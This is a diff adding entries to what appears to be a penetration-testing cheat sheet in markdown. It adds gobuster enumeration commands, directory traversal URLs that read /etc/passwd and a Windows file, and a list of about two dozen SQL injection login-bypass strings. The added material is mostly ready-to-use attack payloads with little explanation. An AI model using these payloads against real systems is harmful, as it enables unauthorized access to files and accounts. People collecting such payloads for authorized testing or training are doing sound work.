@@ -224,9 +224,14 @@ sqlplus <username>/<password>@<IP>/XE
 gobuster dir -u http://<target> -w <wordlist>
 ```
 
-### gobuster subomains (VHOSTS)
+### gobuster subomains 
 ```bash
 gobuster dns -d <target>.com -w <subdomains_list>
+```
+
+```bash
+### gobuster VHOST
+gobuster vhost -u http://<target> -w <wordlist>
 ```
 
 ### feroxbuster
@@ -262,10 +267,45 @@ feroxbuster -u http://<target> -w <wordlist>
 <details>
   <summary><strong>Directory Traversal</strong></summary>
 
+  ### Linux
+  ```bash
+  http://<target>/index.php?page=../../../../../../../../../etc/passwd
+  ```
+
+  ### Windows
+  ```bash
+  http://<target>/public/plugins/alertlist/../../../../../../../../Users/install.txt
+  ```
+
 </details>
 
 <details>
   <summary><strong>SQL Injection</strong></summary>
+
+  ```bash
+  admin' or '1'='1
+  ' or '1'='1
+  " or "1"="1
+  " or "1"="1"--
+  " or "1"="1"/*
+  " or "1"="1"#
+  " or 1=1
+  " or 1=1 --
+  " or 1=1 -
+  " or 1=1--
+  " or 1=1/*
+  " or 1=1#
+  " or 1=1-
+  ") or "1"="1
+  ") or "1"="1"--
+  ") or "1"="1"/*
+  ") or "1"="1"#
+  ") or ("1"="1
+  ") or ("1"="1"--
+  ") or ("1"="1"/*
+  ") or ("1"="1"#
+  ) or '1`='1-
+  ```
 
 </details>
 
